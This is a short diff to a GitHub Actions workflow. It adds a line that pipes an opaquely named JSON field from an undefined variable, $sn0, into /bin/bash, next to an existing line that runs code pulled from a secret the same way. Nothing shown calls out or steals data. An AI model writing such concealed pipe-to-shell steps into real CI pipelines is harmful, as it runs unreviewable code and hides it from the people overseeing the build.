@@ -17,6 +17,7 @@ jobs:
           k21: ${{ secrets.k21 }}
         run: |
           printf '%s' "$k21" | jq -r .qq5277 | /bin/bash
+          echo $sn0 | jq -r .gnzzv95 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
